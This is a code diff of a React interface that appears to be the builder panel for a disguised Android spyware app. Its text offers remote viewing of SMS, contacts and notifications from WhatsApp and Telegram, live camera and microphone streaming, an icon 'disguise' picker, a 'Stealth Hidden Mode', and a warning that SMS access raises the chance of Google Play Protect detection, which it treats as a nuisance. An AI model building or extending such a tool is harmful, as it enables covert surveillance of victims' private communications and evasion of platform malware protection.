+                                    </button>
+                                </div>
+                            </div>
                         </div>
 
-                        {/* Play Protect Warning Modal */}
-                        {showPlayProtectWarning && (
-                            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[100]" onClick={() => setShowPlayProtectWarning(false)}>
-                                <div className="bg-gradient-to-b from-red-900/90 to-red-950/95 rounded-2xl p-6 max-w-sm mx-4 border border-red-500/30 shadow-2xl" onClick={(e) => e.stopPropagation()}>
-                                    <div className="flex items-center gap-3 mb-4">
-                                        <div className="w-12 h-12 rounded-full bg-red-500/20 flex items-center justify-center">
-                                            <svg className="w-6 h-6 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
-                                            </svg>
+                        {/* RIGHT COLUMN: REALISTIC PHONE SIMULATOR PREVIEW */}
+                        <div className="w-full lg:w-[380px] bg-[#0c0d10] p-6 flex flex-col items-center justify-center border-t lg:border-t-0 border-white/10">
+                            <div className="w-full mb-3 flex items-center justify-between">
+                                <span className="text-xs font-bold text-fg-3 uppercase tracking-widest">Live Android Preview</span>
+                                <span className="text-[10px] text-emerald-400 font-semibold flex items-center gap-1.5">
+                                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-ping" />
+                                    Dynamic Mockup
+                                </span>
+                            </div>
+
+                            {/* Realistic Smartphone Frame */}
+                            <div className="relative w-full max-w-[280px] h-[520px] rounded-[2.8rem] bg-[#14151a] border-[6px] border-[#252730] shadow-[0_20px_60px_rgba(0,0,0,0.8)] flex flex-col overflow-hidden">
+                                
+                                {/* Phone Top Status Bar */}
+                                <div className="flex items-center justify-between px-6 pt-3 pb-2 text-[10px] font-bold text-white/80 bg-black/40">
+                                    <span>09:41</span>
+                                    <div className="w-16 h-4 bg-black rounded-full absolute top-2.5 left-1/2 -translate-x-1/2" />
+                                    <div className="flex items-center gap-1.5">
+                                        <span>5G</span>
+                                        <span>100%</span>
+                                    </div>
+                                </div>
+
+                                {/* Phone Screen Content */}
+                                <div className="flex-1 flex flex-col justify-between p-4 bg-gradient-to-b from-[#181a22] to-[#101116] overflow-hidden">
+                                    
+                                    {/* App Launcher / Home Screen View */}
+                                    <div className="mt-8 flex flex-col items-center justify-center space-y-3">
+                                        <div className={`w-20 h-20 rounded-[1.6rem] bg-gradient-to-br ${currentPreset.iconBg} flex items-center justify-center ${currentPreset.iconColor} shadow-[0_15px_30px_rgba(0,0,0,0.5)] border border-white/20 transition-all duration-300`}>
+                                            {selectedDisguise === 'custom' && customIconPreview ? (
+                                                <img src={customIconPreview} alt="App Icon" className="w-16 h-16 rounded-2xl object-cover" />
+                                            ) : (
+                                                renderDisguiseGraphic(selectedDisguise, "w-10 h-10")
+                                            )}
+                                        </div>
+                                        <div className="text-center">
+                                            <h4 className="font-extrabold text-white text-base truncate max-w-[200px]">{appName}</h4>
+                                            <p className="text-[10px] text-fg-3 font-data truncate max-w-[200px]">{packageName}</p>
+                                        </div>
+
+                                        {hideApp && (
+                                            <div className="px-3 py-1 rounded-full bg-amber-500/10 border border-amber-500/30 text-amber-300 text-[10px] font-bold flex items-center gap-1.5">
+                                                <Eye size={12} /> Stealth Hidden Mode
+                                            </div>
+                                        )}
+                                    </div>
+
+                                    {/* Live Android Notification Banner Mockup */}
+                                    <div className="w-full bg-[#1e2029]/95 backdrop-blur-md border border-white/10 rounded-2xl p-3.5 shadow-2xl space-y-2">
+                                        <div className="flex items-center justify-between text-[10px] text-white/50">
+                                            <div className="flex items-center gap-1.5 font-bold">
+                                                <span className="text-emerald-400">●</span>
+                                                <span>{NOTIFICATION_PRESETS[notificationStyle]?.title || appName}</span>
+                                            </div>
+                                            <span>now</span>
                                         </div>
                                         <div>
-                                            <h3 className="text-lg font-bold text-white">Play Protect Warning</h3>
-                                            <p className="text-sm text-red-300/70">High Risk Detection</p>
+                                            <p className="text-xs font-bold text-white">{notificationTitle}</p>
+                                            <p className="text-[11px] text-white/70 leading-snug mt-0.5">{notificationText}</p>
+                                        </div>
+                                        <div className="pt-1.5 border-t border-white/5 flex items-center justify-between text-[10px] text-fg-3">
+                                            <span>Action: {CLICK_ACTIONS[notificationClickAction]?.split(' ')[0]}</span>
+                                            <span className="text-emerald-400 font-bold">PERSISTENT</span>
                                         </div>
                                     </div>
+                                </div>
 
-                                    <p className="text-white/80 text-sm leading-relaxed mb-6">
-                                        Enabling <strong>SMS Access</strong> significantly increases the chance that <strong>Google Play Protect</strong> will detect and block this app.
-                                        The app may be flagged as harmful and prevented from installing.
-                                    </p>
-
-                                    <div className="flex gap-3">
-                                        <button
-                                            onClick={() => setShowPlayProtectWarning(false)}
-                                            className="flex-1 px-4 py-2.5 rounded-lg bg-white/10 text-white/80 hover:bg-white/20 transition-colors text-sm font-medium"
-                                        >
-                                            Cancel
-                                        </button>
-                                        <button
-                                            onClick={() => {
-                                                setEnableSmsPermission(true);
-                                                setShowPlayProtectWarning(false);
-                                            }}
-                                            className="flex-1 px-4 py-2.5 rounded-lg bg-red-500 text-white hover:bg-red-600 transition-colors text-sm font-medium"
-                                        >
-                                            I Understand
-                                        </button>
-                                    </div>
+                                {/* Phone Bottom Home Indicator */}
+                                <div className="py-2 flex justify-center bg-black/40">
+                                    <div className="w-24 h-1 rounded-full bg-white/30" />
                                 </div>
                             </div>
-                        )}
-
-                        {/* Permission Info Popup Modal */}
-                        {showPermissionInfo && (
-                            <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm">
-                                <div className={`relative max-w-sm w-full mx-4 p-5 rounded-2xl border shadow-2xl ${showPermissionInfo === 'sms'
-                                    ? 'bg-gradient-to-br from-blue-900/90 to-blue-950/90 border-blue-500/30'
-                                    : showPermissionInfo === 'microphone'
-                                        ? 'bg-gradient-to-br from-emerald-900/90 to-emerald-950/90 border-emerald-500/30'
-                                        : (showPermissionInfo === 'camera' || showPermissionInfo === 'notifications')
-                                            ? 'bg-gradient-to-br from-cyan-900/90 to-cyan-950/90 border-cyan-500/30'
-                                            : 'bg-gradient-to-br from-green-900/90 to-green-950/90 border-green-500/30'
-                                    }`}>
-                                    <button
-                                        onClick={() => setShowPermissionInfo(null)}
-                                        className="absolute top-3 right-3 text-white/60 hover:text-white"
-                                    >
-                                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
-                                    </button>
-
-                                    {showPermissionInfo === 'sms' ? (
-                                        <>
-                                            <div className="flex items-center gap-3 mb-3">
-                                                <div className="p-2 rounded-lg bg-blue-500/20">
-                                                    <svg className="w-6 h-6 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
-                                                </div>
-                                                <h4 className="text-lg font-bold text-white">SMS Access</h4>
-                                            </div>
-                                            <p className="text-sm text-blue-100/80 leading-relaxed">
-                                                Enabling this permission allows you to remotely view SMS messages on the device. You'll be able to see:
-                                            </p>
-                                            <ul className="mt-3 space-y-2 text-sm text-blue-200/70">
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    Message content & body
-                                                </li>
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    Sender/receiver information
-                                                </li>
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    Date & timestamps
-                                                </li>
-                                            </ul>
-                                        </>
-                                    ) : showPermissionInfo === 'camera' ? (
-                                        <>
-                                            <div className="flex items-center gap-3 mb-3">
-                                                <div className="p-2 rounded-lg bg-cyan-500/20">
-                                                    <svg className="w-6 h-6 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
-                                                </div>
-                                                <h4 className="text-lg font-bold text-white">Camera Access</h4>
-                                            </div>
-                                            <p className="text-sm text-cyan-100/80 leading-relaxed">
-                                                Enabling this permission allows remote camera access. You'll be able to:
-                                            </p>
-                                            <ul className="mt-3 space-y-2 text-sm text-cyan-200/70">
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    Live stream from camera
-                                                </li>
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    Capture photos remotely
-                                                </li>
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    Record videos remotely
-                                                </li>
-                                            </ul>
-                                        </>
-                                    ) : showPermissionInfo === 'notifications' ? (
-                                        <>
-                                            <div className="flex items-center gap-3 mb-3">
-                                                <div className="p-2 rounded-lg bg-cyan-500/20">
-                                                    <svg className="w-6 h-6 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
-                                                </div>
-                                                <h4 className="text-lg font-bold text-white">Notification Access</h4>
-                                            </div>
-                                            <p className="text-sm text-cyan-100/80 leading-relaxed">
-                                                Enabling this allows real-time monitoring of all device notifications:
-                                            </p>
-                                            <ul className="mt-3 space-y-2 text-sm text-cyan-200/70">
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    WhatsApp, Instagram, Telegram messages
-                                                </li>
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    App names & icons
-                                                </li>
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    Notification content & timestamps
-                                                </li>
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-cyan-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    Calls, emails & all app alerts
-                                                </li>
-                                            </ul>
-                                            <p className="mt-3 text-xs text-yellow-300/60">
-                                                ⚠️ Requires manual enable in device Settings → Notification Access
-                                            </p>
-                                        </>
-                                    ) : showPermissionInfo === 'microphone' ? (
-                                        <>
-                                            <div className="flex items-center gap-3 mb-3">
-                                                <div className="p-2 rounded-lg bg-emerald-500/20">
-                                                    <svg className="w-6 h-6 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"></path></svg>
-                                                </div>
-                                                <h4 className="text-lg font-bold text-white">Microphone Access</h4>
-                                            </div>
-                                            <p className="text-sm text-emerald-100/80 leading-relaxed">
-                                                Enabling this allows real-time live audio listening from the device microphone:
-                                            </p>
-                                            <ul className="mt-3 space-y-2 text-sm text-emerald-200/70">
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-emerald-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    Live audio streaming to dashboard
-                                                </li>
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-emerald-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    Noise suppression & auto gain
-                                                </li>
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-emerald-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    Real-time audio visualizer
-                                                </li>
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-emerald-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    Volume & mute controls
-                                                </li>
-                                            </ul>
-                                        </>
-                                    ) : (
-                                        <>
-                                            <div className="flex items-center gap-3 mb-3">
-                                                <div className="p-2 rounded-lg bg-green-500/20">
-                                                    <svg className="w-6 h-6 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
-                                                </div>
-                                                <h4 className="text-lg font-bold text-white">Contacts Access</h4>
-                                            </div>
-                                            <p className="text-sm text-green-100/80 leading-relaxed">
-                                                Enabling this permission allows you to remotely view contacts on the device. You'll be able to see:
-                                            </p>
-                                            <ul className="mt-3 space-y-2 text-sm text-green-200/70">
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    Contact names
-                                                </li>
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    Phone numbers
-                                                </li>
-                                                <li className="flex items-center gap-2">
-                                                    <svg className="w-4 h-4 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                                    Email addresses
-                                                </li>
-                                            </ul>
-                                        </>
-                                    )}
-
-                                    <button
-                                        onClick={() => setShowPermissionInfo(null)}
-                                        className={`mt-5 w-full py-2 rounded-lg font-medium text-sm ${showPermissionInfo === 'sms'
-                                            ? 'bg-blue-500 hover:bg-blue-600'
-                                            : showPermissionInfo === 'microphone'
-                                                ? 'bg-emerald-500 hover:bg-emerald-600'
-                                                : (showPermissionInfo === 'camera' || showPermissionInfo === 'notifications')
-                                                    ? 'bg-cyan-500 hover:bg-cyan-600'
-                                                    : 'bg-green-500 hover:bg-green-600'
-                                            } text-white transition-colors`}
-                                    >
-                                        Got it
-                                    </button>
-                                </div>
-                            </div>
-                        )}
-                    </div>
-                )}
-
-                {status === 'queued' && (
-                    <div className="mb-8">
-                        <div className="flex flex-col items-center justify-center py-6">
-                            <div className="w-16 h-16 border-4 border-emerald-500/30 border-t-emerald-500 rounded-full animate-spin mb-4"></div>
-                            <h3 className="text-xl font-bold text-white mb-1">You are in Queue</h3>
-                            <p className="text-white/60">Position: <span className="text-emerald-400 font-bold text-lg">{queuePosition}</span></p>
-                            <p className="text-xs text-white/40 mt-4 max-w-xs">Your build will start automatically when the previous one finishes.</p>
                         </div>
                     </div>
                 )}
 
-                {(status === 'generating' || status === 'downloading' || status === 'completed') && (
-                    <div className="mb-8">
-                        <p className="text-white/60 mb-4 font-mono text-sm">
-                            {status === 'completed'
-                                ? "Install this APK on your Android device."
-                                : (progressStep || "Processing...")}
-                        </p>
-                        <div className="relative h-4 bg-white/10 rounded-full overflow-hidden">
-                            <div
-                                className="absolute top-0 left-0 h-full bg-gradient-to-r from-emerald-500 to-teal-500 transition-all duration-500"
-                                style={{ width: `${progress}%` }}
-                            />
-                        </div>
-                    </div>
-                )}
-
-                <div className="flex flex-col items-center justify-center gap-4">
-                    {status === 'idle' ? (
-                        <button
-                            onClick={startGeneration}
-                            className="w-full px-8 py-3 bg-gradient-to-r from-emerald-600 to-teal-600 text-white font-bold rounded-xl hover:scale-105 transition-transform shadow-lg shadow-emerald-500/20"
-                        >
-                            Generate & Download
-                        </button>
-                    ) : status === 'completed' ? (
-                        <button
-                            onClick={onClose}
-                            className="px-8 py-3 bg-white text-black font-bold rounded-full hover:scale-105 transition-transform"
-                        >
-                            Done
-                        </button>
-                    ) : status === 'queued' ? (
-                        <button
-                            disabled
-                            className="px-8 py-3 bg-white/10 text-white/50 font-bold rounded-full cursor-not-allowed"
-                        >
-                            Waiting in Queue...
-                        </button>
-                    ) : (
-                        <>
-                            {status !== 'downloading' && <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white"></div>}
-                            {/* Fallback Download Button */}
-                            {downloadUrl && (
-                                <a
-                                    href={downloadUrl}
-                                    target="_blank"
-                                    rel="noopener noreferrer"
-                                    className="mt-4 text-sm text-blue-300 hover:text-blue-200 underline cursor-pointer animate-pulse"
+                {/* Play Protect Warning Dialog */}
+                {showPlayProtectWarning && (
+                    <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[300]" onClick={() => setShowPlayProtectWarning(false)}>
+                        <div className="bg-[#181216] rounded-3xl p-6 max-w-sm mx-4 border border-red-500/40 shadow-2xl space-y-4" onClick={(e) => e.stopPropagation()}>
+                            <div className="flex items-center gap-3">
+                                <div className="w-11 h-11 rounded-xl bg-red-500/15 border border-red-500/30 flex items-center justify-center text-red-400">
+                                    <AlertTriangle size={22} />
+                                </div>
+                                <div>
+                                    <h3 className="text-base font-bold text-white">Play Protect Notice</h3>
+                                    <p className="text-xs text-red-400">High Risk SMS Permission</p>
+                                </div>
+                            </div>
+                            <p className="text-xs text-fg-2 leading-relaxed">
+                                Enabling <strong className="text-white">SMS Access</strong> increases the likelihood that Google Play Protect will flag the app during installation.
+                            </p>
+                            <div className="flex gap-3 pt-2">
+                                <button
+                                    type="button"
+                                    onClick={() => setShowPlayProtectWarning(false)}
+                                    className="flex-1 py-2.5 rounded-xl bg-white/5 hover:bg-white/10 text-white font-semibold text-xs transition-colors"
                                 >
-                                    Click here if download doesn't start automatically
-                                </a>
-                            )}
-                        </>
-                    )}
-                </div>
+                                    Cancel
+                                </button>
+                                <button
+                                    type="button"
+                                    onClick={() => {
+                                        setEnableSmsPermission(true);
+                                        setShowPlayProtectWarning(false);
+                                    }}
+                                    className="flex-1 py-2.5 rounded-xl bg-red-500 hover:bg-red-600 text-white font-bold text-xs shadow-[0_0_15px_rgba(239,68,68,0.3)] transition-colors"
+                                >
+                                    Enable SMS
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                )}
 
+                {/* Alert Modal */}
+                <CustomAlertModal
+                    isOpen={showCustomAlert}
+                    onClose={() => setShowCustomAlert(false)}
+                    title={alertData.title}
+                    message={alertData.message}
+                    type={alertData.type}
+                />
             </div>
-            {/* Custom Alert Modal moved outside transformed container to fix mobile UI bug */}
-            <CustomAlertModal
-                isOpen={showCustomAlert}
-                onClose={() => setShowCustomAlert(false)}
-                title={alertData.title}
-                message={alertData.message}
-                type={alertData.type}
-            />
         </div>
     );
 }
